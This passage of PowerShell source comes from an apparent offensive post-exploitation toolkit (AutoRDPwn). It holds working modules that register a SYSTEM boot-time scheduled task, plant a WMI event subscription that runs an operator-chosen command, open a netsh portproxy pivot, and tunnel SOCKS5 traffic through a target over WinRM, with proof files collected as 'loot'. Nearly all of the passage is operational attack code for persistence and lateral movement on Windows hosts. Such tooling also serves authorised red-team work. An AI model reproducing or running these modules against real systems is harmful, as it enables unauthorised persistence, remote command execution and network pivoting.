        Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force -ErrorAction Stop | Out-Null
        $registered = Get-ScheduledTask -TaskName $name -ErrorAction Stop
        $triggerNames = New-Object System.Collections.Generic.List[string]
        foreach ($item in @($registered.Triggers)) { $triggerNames.Add([string]$item.CimClass.CimClassName) }
        $executePath = ''
        $argumentsText = ''
        foreach ($item in @($registered.Actions)) { $executePath = [string]$item.Execute; $argumentsText = [string]$item.Arguments }
        return [pscustomobject]@{
            Name      = [string]$registered.TaskName
            State     = [string]$registered.State
            User      = [string]$registered.Principal.UserId
            Run       = [string]$registered.Principal.RunLevel
            Triggers  = @($triggerNames.ToArray())
            Execute   = $executePath
            Arguments = $argumentsText
        }
    }
    $triggerText = (@($result.Triggers) -join ' ')
    if ([string]$result.User -notmatch '(?i)^(SYSTEM|S-1-5-18)$' -or $triggerText -notmatch 'Boot') {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $taskName -ScriptBlock {
                param($name)
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
        throw ('The task was registered but does not report a boot trigger running as SYSTEM (principal ' + [string]$result.User + ', triggers ' + $triggerText + ').')
    }
    if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
        if (-not $script:ARRemoteTasks.Contains($taskName)) { $script:ARRemoteTasks.Add($taskName) }
    }
    if ($command.Contains($proofLog) -and -not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
    Write-ARSuccess ('Boot task registered: ' + $taskName + ' (SYSTEM, trigger ' + $triggerText + ', state ' + [string]$result.State + ')')
    Write-ARInfo ('  runs: ' + [string]$result.Execute + ' ' + [string]$result.Arguments)
    if ($command.Contains($proofLog)) { Write-ARInfo ('  the payload appends its proof to ' + $proofLog + ' at the next boot.') }
    Write-ARInfo 'The task stays registered until session cleanup or a removal run.'
    Set-ARStatus 'Boot task registered' 'Ok'
    return [pscustomobject]@{
        Id       = '523'
        Action   = 'BootTask'
        Mode     = 'install'
        Target   = $target
        Task     = $taskName
        Command  = [string]$command
        User     = [string]$result.User
        Triggers = @($result.Triggers)
        Removed  = $false
    }
}

function Invoke-ARModuleWmiSubscription {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WMI event subscription'
    $session = Get-ARTargetSession
    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn wmi payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
    $command = $defaultCommand
    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the WMI consumer must run' $defaultCommand }
    $command = ([string]$command).Trim()
    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The WMI consumer command is empty.' }
    if ($command -match "[\r\n]") { throw 'The WMI consumer command must be a single line.' }
    $filterName = 'AutoRDPwnF' + (New-ARModuleToken -Length 6)
    $consumerName = 'AutoRDPwnC' + (New-ARModuleToken -Length 6)
    $proof = ''
    $removedParts = @()
    $left = -1
    try {
        $created = Invoke-ARRemote -Session $session -ArgumentList $filterName, $consumerName, $command -ScriptBlock {
            param($filter, $consumer, $commandLine)
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpDownStatus = 1"
            $filterObject = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $query } -ErrorAction Stop
            $consumerObject = $null
            try {
                $consumerObject = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumer; CommandLineTemplate = $commandLine } -ErrorAction Stop
                $null = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filterObject; Consumer = $consumerObject } -ErrorAction Stop
            }
            catch {
                # A partial trio outlives its own run, so the half this call created goes now.
                if ($null -ne $consumerObject) { Remove-WmiObject -InputObject $consumerObject -ErrorAction SilentlyContinue }
                if ($null -ne $filterObject) { Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
                throw
            }
            $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue | Where-Object { ([string]$_.Filter + ' ' + [string]$_.Consumer).Contains(('Name="' + $filter + '"')) })
            return [pscustomobject]@{
                Filter   = $filter
                Consumer = $consumer
                Bindings = [int]$bindings.Count
            }
        }
        if ([int]$created.Bindings -lt 1) { throw 'The filter and the consumer exist but no binding was created.' }
        Write-ARSuccess ('WMI subscription created: ' + $filterName + ' / ' + $consumerName)
        if ($command.Contains($proofLog)) {
            if (-not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
            for ($attempt = 0; $attempt -lt 15; $attempt++) {
                Start-Sleep -Seconds 3
                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
                    param($path)
                    if (-not (Test-Path -LiteralPath $path)) { return '' }
                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
                })
                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
            }
            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof line appeared in 45 s: the consumer fires on the next system uptime poll, so a slow target may need a second run.' }
            else {
                Write-ARSuccess 'The consumer ran this command:'
                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 20) -join "`n")
                $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
                $localProof = Join-Path (Get-ARLootDirectory 'persistence') ($safeTarget + '-wmi-proof-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.log')
                try { Receive-ARFileFromTarget -RemotePath $proofLog -LocalPath $localProof -Session $session | Out-Null }
                catch { Write-ARWarn ('Proof copy could not be pulled: ' + $_.Exception.Message) }
            }
        }
    }
    finally {
        try {
            $removal = Invoke-ARRemote -Session $session -ArgumentList $filterName, $consumerName -ScriptBlock {
                param($filter, $consumer)
                $removed = New-Object System.Collections.Generic.List[string]
                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
                foreach ($binding in $bindings) {
                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
                    if ($references.Contains(('Name="' + $filter + '"')) -or $references.Contains(('Name="' + $consumer + '"'))) {
                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
                        $removed.Add('binding')
                    }
                }
                foreach ($instance in @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumer })) {
                    Remove-WmiObject -InputObject $instance -ErrorAction SilentlyContinue
                    $removed.Add('consumer')
                }
                foreach ($instance in @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filter })) {
                    Remove-WmiObject -InputObject $instance -ErrorAction SilentlyContinue
                    $removed.Add('filter')
                }
                $remaining = 0
                $remaining = $remaining + @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumer }).Count
                $remaining = $remaining + @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filter }).Count
                return [pscustomobject]@{ Removed = @($removed.ToArray()); Left = [int]$remaining }
            }
            $removedParts = @($removal.Removed)
            $left = [int]$removal.Left
            if ($left -eq 0) { Write-ARInfo ('WMI subscription removed: ' + $filterName + ' / ' + $consumerName + ' (nothing is left registered)') }
            else { Write-ARWarn ('WMI objects still present after the delete: ' + [string]$left + ' under ' + $filterName + ' / ' + $consumerName + '.') }
        }
        catch { Write-ARWarn ('WMI subscription removal incomplete: ' + $_.Exception.Message) }
        if ($command.Contains($proofLog)) {
            try {
                Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
                } | Out-Null
            }
            catch { }
            [void]$script:ARModuleFiles.Remove($proofLog)
        }
    }
    Set-ARStatus 'WMI subscription proof finished' 'Ok'
    return [pscustomobject]@{
        Id       = '524'
        Action   = 'WmiSubscription'
        Target   = $target
        Filter   = $filterName
        Consumer = $consumerName
        Command  = $command
        Proof    = ([string]$proof).Trim()
        Removed  = $removedParts
        Left     = [int]$left
    }
}

function Invoke-ARModulePivotProxy {
    param(
        [switch]$Remove,
        [int]$ListenPort = 8080,
        [string]$ListenAddress = '0.0.0.0',
        [int]$ConnectPort = 8080,
        [string]$ConnectAddress = ''
    )
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Pivot port proxy'
    $session = Get-ARTargetSession
    $mode = 'add'
    if ($Remove) { $mode = 'remove' }
    elseif (-not $script:ARInvokedFromOption) {
        $choice = Read-ARValue 'Operation (1 add, 2 list, 3 remove)' '1'
        if ($choice -eq '2') { $mode = 'list' }
        elseif ($choice -eq '3') { $mode = 'remove' }
    }
    if ($mode -eq 'add' -and -not $script:ARInvokedFromOption) {
        $text = Read-ARValue 'Listen port on the target' ([string]$ListenPort)
        $parsed = 0
        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 1 -or $parsed -gt 65535) { throw ('Invalid listen port: ' + $text) }
        $ListenPort = $parsed
        $ListenAddress = Read-ARValue 'Listen address on the target' $ListenAddress
        $text = Read-ARValue 'Destination port' ([string]$ConnectPort)
        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 1 -or $parsed -gt 65535) { throw ('Invalid destination port: ' + $text) }
        $ConnectPort = $parsed
        $ConnectAddress = Read-ARValue 'Destination address' $ConnectAddress
    }
    if ($mode -eq 'add') {
        if ([string]::IsNullOrWhiteSpace($ConnectAddress)) { throw 'The destination address is required to publish a pivot proxy.' }
        if ([string]::IsNullOrWhiteSpace($ListenAddress)) { throw 'The listen address is required to publish a pivot proxy.' }
    }
    # netsh keeps every v4tov4 rule under this key: the value name is
    # "listenaddress/listenport" and the data is "connectaddress/connectport".
    # Reading the registry is language independent; parsing `netsh show` is not,
    # so every listing and every conflict check below reads the key directly.
    $listBlock = {
        $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
        if (-not (Test-Path -LiteralPath $root)) { return @() }
        $key = Get-Item -LiteralPath $root -ErrorAction Stop
        $rules = New-Object System.Collections.Generic.List[object]
        foreach ($name in @($key.GetValueNames())) {
            if ([string]::IsNullOrWhiteSpace([string]$name)) { continue }
            $slash = ([string]$name).LastIndexOf('/')
            if ($slash -lt 1) { continue }
            $destination = [string]$key.GetValue($name, '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
            $connectSlash = $destination.LastIndexOf('/')
            if ($connectSlash -lt 1) { continue }
            $rules.Add([pscustomobject]@{
                ListenAddress  = ([string]$name).Substring(0, $slash)
                ListenPort     = ([string]$name).Substring($slash + 1)
                ConnectAddress = $destination.Substring(0, $connectSlash)
                ConnectPort    = $destination.Substring($connectSlash + 1)
            })
        }
        return @($rules.ToArray())
    }
    $existingRules = @(Invoke-ARRemote -Session $session -ScriptBlock $listBlock)
    Write-ARInfo ('Port proxy rules already on ' + $target + ': ' + [string]$existingRules.Count)
    foreach ($rule in $existingRules) {
        Write-Host ('    ' + [string]$rule.ListenAddress + ':' + [string]$rule.ListenPort + ' -> ' + [string]$rule.ConnectAddress + ':' + [string]$rule.ConnectPort)
    }
    $created = $false
    $removed = @()
    $failed = @()
    $message = ''
    if ($mode -eq 'add') {
        $addBlock = {
            param($listenPort, $listenAddress, $connectPort, $connectAddress)
            $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
            # Refuse a second rule on the same listen endpoint: netsh overwrites
            # silently and the first pivot would disappear without a word.
            if (Test-Path -LiteralPath $root) {
                $key = Get-Item -LiteralPath $root -ErrorAction Stop
                foreach ($name in @($key.GetValueNames())) {
                    $slash = ([string]$name).LastIndexOf('/')
                    if ($slash -lt 1) { continue }
                    if (([string]$name).Substring(0, $slash) -ne $listenAddress) { continue }
                    if (([string]$name).Substring($slash + 1) -ne [string]$listenPort) { continue }
                    return [pscustomobject]@{
                        Ok       = $false
                        Conflict = $true
                        Text     = ('listen endpoint already published: ' + $listenAddress + ':' + $listenPort + ' -> ' + [string]$key.GetValue($name, ''))
                        Landed   = $false
                    }
                }
            }
            $output = @(& netsh.exe interface portproxy add v4tov4 ('listenport=' + $listenPort) ('listenaddress=' + $listenAddress) ('connectport=' + $connectPort) ('connectaddress=' + $connectAddress) 2>&1)
            $exit = $LASTEXITCODE
            $text = ((@($output) | ForEach-Object { [string]$_ }) -join ' ').Trim()
            # netsh returns 0 for addresses it quietly refuses, so the proof is
            # the registry value, not the exit code.
            $landed = $false
            if (Test-Path -LiteralPath $root) {
                $key = Get-Item -LiteralPath $root -ErrorAction Stop
                if ($null -ne $key.GetValue(($listenAddress + '/' + [string]$listenPort), $null)) { $landed = $true }
            }
            return [pscustomobject]@{ Ok = $landed; Conflict = $false; Text = $text; Landed = $landed; ExitCode = $exit }
        }
        $result = Invoke-ARRemote -Session $session -ArgumentList $ListenPort, $ListenAddress, $ConnectPort, $ConnectAddress -ScriptBlock $addBlock
        if ([bool]$result.Conflict) { throw ('Pivot proxy refused: ' + [string]$result.Text) }
        $created = [bool]$result.Ok
        $message = [string]$result.Text
        if (-not $created) {
            throw ('netsh did not publish the rule (' + $ListenAddress + ':' + $ListenPort + ' -> ' + $ConnectAddress + ':' + $ConnectPort + '). ' + $message)
        }
        $record = [string]$ListenPort + '|' + $ListenAddress
        if (-not $script:ARPortProxyPorts.Contains($record)) { $script:ARPortProxyPorts.Add($record) }
        Write-ARSuccess ('Pivot proxy published on ' + $target + ': ' + $ListenAddress + ':' + $ListenPort + ' -> ' + $ConnectAddress + ':' + $ConnectPort)
    }
    elseif ($mode -eq 'remove') {
        $entries = @($script:ARPortProxyPorts.ToArray())
        if ($entries.Count -eq 0) {
            Write-ARInfo 'No pivot proxy was registered by this session, so nothing is removed.'
        }
        else {
            $removeBlock = {
                param($items)
                $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
                $deleted = New-Object System.Collections.Generic.List[string]
                $kept = New-Object System.Collections.Generic.List[string]
                if (Test-Path -LiteralPath $root) {
                    $key = Get-Item -LiteralPath $root -ErrorAction Stop
                    foreach ($entry in @($items)) {
                        $text = [string]$entry
                        if ([string]::IsNullOrWhiteSpace($text)) { continue }
                        $bar = $text.IndexOf('|')
                        $listenPort = $text
                        $listenAddress = '0.0.0.0'
                        if ($bar -ge 0) {
                            $listenPort = $text.Substring(0, $bar)
                            $listenAddress = $text.Substring($bar + 1)
                        }
                        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
                        $valueName = $listenAddress + '/' + $listenPort
                        if ($null -eq $key.GetValue($valueName, $null)) { continue }
                        $null = & netsh.exe interface portproxy delete v4tov4 ('listenport=' + $listenPort) ('listenaddress=' + $listenAddress) 2>&1
                        if ($null -ne $key.GetValue($valueName, $null)) { $kept.Add($text) }
                        else { $deleted.Add($text) }
                    }
                }
                return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($kept.ToArray()) }
            }
            $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($entries)) -ScriptBlock $removeBlock
            $removed = @($removal.Deleted)
            $failed = @($removal.Failed)
            foreach ($entry in $removed) {
                [void]$script:ARPortProxyPorts.Remove([string]$entry)
                Write-ARSuccess ('Pivot proxy removed: ' + [string]$entry)
            }
            foreach ($entry in $failed) { Write-ARWarn ('Pivot proxy still published: ' + [string]$entry) }
        }
    }
    Set-ARStatus ('Pivot proxy ' + $mode + ' finished') 'Ok'
    return [pscustomobject]@{
        Id             = '620'
        Action         = 'PivotProxy'
        Mode           = $mode
        Target         = $target
        ListenAddress  = $ListenAddress
        ListenPort     = [int]$ListenPort
        ConnectAddress = $ConnectAddress
        ConnectPort    = [int]$ConnectPort
        Existing       = @($existingRules)
        Created        = [bool]$created
        Removed        = @($removed)
        Failed         = @($failed)
        Output         = $message
    }
}

function Invoke-ARModuleSocksOverWinRm {
    param(
        [int]$Port = 1080,
        [string]$BindAddress = '127.0.0.1',
        [int]$LifetimeSeconds = 1800,
        [int]$MaxConnections = 8,
        [int]$IdleTimeoutSeconds = 120
    )
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SOCKS over WinRM'
    $session = Get-ARTargetSession
    if (-not $script:ARInvokedFromOption) {
        $text = Read-ARValue 'Local SOCKS port' ([string]$Port)
        $parsed = 0
        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 0 -or $parsed -gt 65535) { throw ('Invalid SOCKS port: ' + $text) }
        $Port = $parsed
        $BindAddress = Read-ARValue 'Local bind address' $BindAddress
    }
    if ($LifetimeSeconds -lt 5) { $LifetimeSeconds = 5 }
    if ($MaxConnections -lt 1) { $MaxConnections = 1 }
    $address = [System.Net.IPAddress]::Parse($BindAddress)
    $listener = New-Object System.Net.Sockets.TcpListener($address, $Port)
    try { $listener.Start() }
    catch { throw ('The local SOCKS listener could not bind ' + $BindAddress + ':' + [string]$Port + ': ' + $_.Exception.Message) }
    $actualPort = [int]$listener.LocalEndpoint.Port
    $deadline = (Get-Date).AddSeconds($LifetimeSeconds)
    $handled = 0
    $failures = New-Object System.Collections.Generic.List[string]
    $readExact = {
        param($stream, $count, $timeoutMs)
        $buffer = New-Object byte[] $count
        $offset = 0
        $limit = (Get-Date).AddMilliseconds($timeoutMs)
        while ($offset -lt $count) {
            if ((Get-Date) -gt $limit) { throw 'SOCKS handshake timed out' }
            try { $read = $stream.Read($buffer, $offset, $count - $offset) }
            catch { throw ('SOCKS handshake failed: ' + $_.Exception.Message) }
            if ($read -le 0) { throw 'The SOCKS client closed during the handshake.' }
            $offset += $read
        }
        return $buffer
    }
    $startBlock = {
        param($directory, $destHost, $destPort, $jobName)
        if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
        $job = Start-Job -Name $jobName -ArgumentList $directory, $destHost, $destPort -ScriptBlock {
            param($work, $hopHost, $hopPort)
            $outPath = Join-Path $work 'out'
            $errorPath = Join-Path $work 'err'
            $client = New-Object System.Net.Sockets.TcpClient
            try {
                $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
                if (-not $async.AsyncWaitHandle.WaitOne(5000, $false)) { throw ('connect timeout to ' + $hopHost + ':' + [string]$hopPort) }
                $client.EndConnect($async)
                $stream = $client.GetStream()
                # Append mode with read sharing: the operator tails this file
                # while the relay writes it, so every chunk is flushed at once.
                $output = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
                try {
                    $life = (Get-Date).AddSeconds(1800)
                    $lastRead = Get-Date
                    while ((Get-Date) -lt $life) {
                        if (Test-Path -LiteralPath (Join-Path $work 'stop')) { break }
                        # Chunks are numbered by the operator, so ordering them here
                        # keeps the byte stream intact even when two land together.
                        $queued = New-Object System.Collections.Generic.List[object]
                        foreach ($file in @(Get-ChildItem -LiteralPath $work -Filter 'req.*.bin' -File -ErrorAction SilentlyContinue)) {
                            $index = 0
                            if (-not [int]::TryParse([string]$file.BaseName.Substring(4), [ref]$index)) { continue }
                            $queued.Add([pscustomobject]@{ Index = $index; Path = [string]$file.FullName })
                        }
                        foreach ($item in @($queued.ToArray() | Sort-Object -Property Index)) {
                            if (-not (Test-Path -LiteralPath [string]$item.Path)) { continue }
                            $payload = [System.IO.File]::ReadAllBytes([string]$item.Path)
                            Remove-Item -LiteralPath ([string]$item.Path) -Force -ErrorAction SilentlyContinue
                            if ($payload.Length -gt 0) {
                                $stream.Write($payload, 0, $payload.Length)
                                $stream.Flush()
                            }
                        }
                        if ($client.Available -gt 0) {
                            $buffer = New-Object byte[] 16384
                            $read = $stream.Read($buffer, 0, $buffer.Length)
                            if ($read -le 0) { break }
                            $output.Write($buffer, 0, $read)
                            $output.Flush()
                            $lastRead = Get-Date
                        }
                        elseif (((Get-Date) - $lastRead).TotalSeconds -gt 600) { break }
                        Start-Sleep -Milliseconds 40
                    }
                }
                finally { $output.Dispose() }
            }
            catch { try { [System.IO.File]::WriteAllText($errorPath, $_.Exception.Message) } catch { } }
            finally {
                try { $client.Close() } catch { }
                try { [System.IO.File]::WriteAllText((Join-Path $work 'eof'), '1') } catch { }
            }
        }
        return [pscustomobject]@{ Id = [int]$job.Id; Name = [string]$job.Name; State = [string]$job.State }
    }
    $pollBlock = {
        param($directory, $offset, $wantData)
        $result = [pscustomobject]@{ Size = [int64]0; Data = ''; Eof = $false; Error = ''; Pending = 0 }
        $outPath = Join-Path $directory 'out'
        if (Test-Path -LiteralPath $outPath) {
            $info = Get-Item -LiteralPath $outPath -ErrorAction SilentlyContinue
            if ($info) { $result.Size = [int64]$info.Length }
            if ($wantData -and $result.Size -gt $offset) {
                $length = [int]($result.Size - $offset)
                if ($length -gt 32768) { $length = 32768 }
                $stream = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                try {
                    $stream.Position = $offset
                    $buffer = New-Object byte[] $length
                    $read = $stream.Read($buffer, 0, $length)
                    if ($read -gt 0) { $result.Data = [Convert]::ToBase64String($buffer, 0, $read) }
                }
                finally { $stream.Dispose() }
            }
        }
        $result.Pending = @(Get-ChildItem -LiteralPath $directory -Filter 'req.*.bin' -File -ErrorAction SilentlyContinue).Count
        $result.Eof = Test-Path -LiteralPath (Join-Path $directory 'eof')
        $errorPath = Join-Path $directory 'err'
        if (Test-Path -LiteralPath $errorPath) {
            try { $result.Error = [string]([System.IO.File]::ReadAllText($errorPath)) } catch { }
        }
        return $result
    }
    $stopBlock = {
        param($directory)
        $closed = 0
        $removed = 0
        $left = 0
        try { [System.IO.File]::WriteAllText((Join-Path $directory 'stop'), '1') } catch { }
        foreach ($job in @(Get-Job -ErrorAction SilentlyContinue)) {
            if ([string]$job.Name -notlike 'ARPivot_*') { continue }
            try { Stop-Job -Job $job -ErrorAction Stop; $closed++ } catch { }
            try { Remove-Job -Job $job -Force -ErrorAction SilentlyContinue } catch { }
        }
        if (Test-Path -LiteralPath $directory) {
            for ($attempt = 0; $attempt -lt 3; $attempt++) {
                try {
                    Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction Stop
                    break
                }
                catch { Start-Sleep -Milliseconds 150 }
            }
            if (Test-Path -LiteralPath $directory) { $left = 1 } else { $removed = 1 }
        }
        return [pscustomobject]@{ Closed = [int]$closed; Removed = [int]$removed; Left = [int]$left }
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('SOCKS5 over WinRM --> ' + 'socks5://' + $BindAddress + ':' + [string]$actualPort) -ForegroundColor Blue
    Write-Host ('Operator process id: ' + [string]$PID + '   target: ' + $target + '   lifetime: ' + [string]$LifetimeSeconds + ' s') -ForegroundColor Gray
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try {
        while ((Get-Date) -lt $deadline -and $handled -lt $MaxConnections) {
            if (-not $listener.Pending()) { Start-Sleep -Milliseconds 100; continue }
            $connection = $listener.AcceptTcpClient()
            $connection.NoDelay = $true
            $remoteDirectory = 'C:\Windows\Temp\' + (New-ARRemoteTempName)
            $jobName = 'ARPivot_' + (New-ARModuleToken -Length 6)
            $relayStream = $null
            try {
                $relayStream = $connection.GetStream()
                $relayStream.ReadTimeout = 10000
                $relayStream.WriteTimeout = 10000
                $greeting = & $readExact $relayStream 2 10000
                if ([int]$greeting[0] -ne 5) { throw 'Not a SOCKS5 client.' }
                $methods = & $readExact $relayStream ([int]$greeting[1]) 10000
                $relayStream.Write([byte[]]@(5, 0), 0, 2)
                $request = & $readExact $relayStream 4 10000
                if ([int]$request[0] -ne 5) { throw 'The SOCKS request has the wrong version.' }
                if ([int]$request[1] -ne 1) {
                    $relayStream.Write([byte[]]@(5, 7, 0, 1, 0, 0, 0, 0, 0, 0), 0, 10)
                    throw ('SOCKS command ' + [string]$request[1] + ' is not supported: only CONNECT is.')
                }
                $destHost = ''
                switch ([int]$request[3]) {
                    1 {
                        $raw = & $readExact $relayStream 4 10000
                        $destHost = ([System.Net.IPAddress]::new([byte[]]$raw)).ToString()
                    }
                    3 {
                        $length = (& $readExact $relayStream 1 10000)[0]
                        $raw = & $readExact $relayStream ([int]$length) 10000
                        $destHost = [System.Text.Encoding]::ASCII.GetString($raw)
                    }
                    4 {
                        $raw = & $readExact $relayStream 16 10000
                        $destHost = ([System.Net.IPAddress]::new([byte[]]$raw)).ToString()
                    }
                    default { throw ('SOCKS address type ' + [string]$request[3] + ' is not supported.') }
                }
                $portBytes = & $readExact $relayStream 2 10000
                $destPort = ([int]$portBytes[0] * 256) + [int]$portBytes[1]
                if ([string]::IsNullOrWhiteSpace($destHost)) { throw 'The SOCKS request has no destination host.' }
                if ($destPort -lt 1 -or $destPort -gt 65535) { throw ('The SOCKS request has an invalid destination port: ' + [string]$destPort) }
                Write-ARInfo ('Relaying ' + $destHost + ':' + [string]$destPort + ' through ' + $target + ' (' + $remoteDirectory + ')')
                $started = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $destHost, $destPort, $jobName -ScriptBlock $startBlock
                if (-not $script:ARRemoteTempDirs.Contains($remoteDirectory)) { $script:ARRemoteTempDirs.Add($remoteDirectory) }
                $relayStream.Write([byte[]]@(5, 0, 0, 1, 127, 0, 0, 1, 0, 0), 0, 10)
                $handled++
                Write-ARProgress -Activity 'SOCKS over WinRM' -Percent ([int](($handled * 100) / $MaxConnections)) -Status ('connection ' + [string]$handled)
                $sequence = 1
                $offset = 0
                $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
                while ($true) {
                    if ((Get-Date) -gt $deadline) { Write-ARWarn 'The SOCKS tunnel reached its lifetime cap and closed.'; break }
                    if ((Get-Date) -gt $idle) { Write-ARWarn 'The SOCKS tunnel closed after the idle timeout.'; break }
                    $state = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $offset, $true -ScriptBlock $pollBlock
                    if (-not [string]::IsNullOrEmpty([string]$state.Error)) { throw ('The relay on ' + $target + ' failed: ' + [string]$state.Error) }
                    $moved = $false
                    $payload = [string]$state.Data
                    if (-not [string]::IsNullOrEmpty($payload)) {
                        $bytes = [Convert]::FromBase64String($payload)
                        $relayStream.Write($bytes, 0, $bytes.Length)
                        $relayStream.Flush()
                        $offset += $bytes.Length
                        $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
                        $moved = $true
                    }
                    if ([bool]$state.Eof) {
                        if ([int64]$state.Size -le $offset) { break }
                    }
                    if ([int]$state.Pending -lt 8 -and $relayStream.DataAvailable) {
                        $buffer = New-Object byte[] 16384
                        $read = $relayStream.Read($buffer, 0, $buffer.Length)
                        if ($read -le 0) { break }
                        $chunk = New-Object byte[] $read
                        [Array]::Copy($buffer, $chunk, $read)
                        $requestPath = Join-Path $remoteDirectory ('req.' + [string]$sequence + '.bin')
                        Invoke-ARRemote -Session $session -ArgumentList $requestPath, ([Convert]::ToBase64String($chunk)) -ScriptBlock {
                            param($path, $base64)
                            [System.IO.File]::WriteAllBytes($path, [Convert]::FromBase64String($base64))
                        } | Out-Null
                        $sequence++
                        $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
                        $moved = $true
                    }
                    if (-not $moved) { Start-Sleep -Milliseconds 20 }
                }
            }
            catch {
                $failures.Add($_.Exception.Message)
                Write-ARWarn ('SOCKS connection ended: ' + $_.Exception.Message)
            }
            finally {
                try {
                    $teardown = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock $stopBlock
                    if ([int]$teardown.Left -ne 0) { Write-ARWarn ('The relay directory is still on ' + $target + ': ' + $remoteDirectory) }
                    else { [void]$script:ARRemoteTempDirs.Remove($remoteDirectory) }
                }
                catch { Write-ARWarn ('Relay teardown on ' + $target + ' failed: ' + $_.Exception.Message) }
                try { if ($relayStream) { $relayStream.Close() } } catch { }
                try { $connection.Close() } catch { }
            }
        }
    }
    finally {
        try { $listener.Stop() } catch { }
        try { $listener.Server.Close() } catch { }
        $leak = 0
        try {
            $probe = New-Object System.Net.Sockets.TcpClient
            try {
                $async = $probe.BeginConnect($BindAddress, $actualPort, $null, $null)
                if ($async.AsyncWaitHandle.WaitOne(1000, $false)) { $probe.EndConnect($async); $leak = 1 }
            }
            catch { }
            finally { $probe.Close() }
        }
        catch { }
        if ($leak -eq 1) { Write-ARWarn ('The SOCKS port ' + [string]$actualPort + ' still accepts connections after the close.') }
    }
    Set-ARStatus ('SOCKS over WinRM stopped after ' + [string]$handled + ' connection(s)') 'Ok'
    return [pscustomobject]@{
        Id         = '621'
        Action     = 'SocksOverWinRm'
        Target     = $target
        Uri        = ('socks5://' + $BindAddress + ':' + [string]$actualPort)
        Port       = [int]$actualPort
        ProcessId  = [int]$PID
        Connections = [int]$handled
        PortFreed  = [bool]($leak -eq 0)
        Failures   = @($failures.ToArray())
    }
}

function Invoke-ARModuleShareMount {
    param(
        [string]$Share = '',
        [string]$DriveLetter = 'Z',
        [string]$User = '',
        [string]$Password = ''
    )
    $target = Get-ARTargetComputer
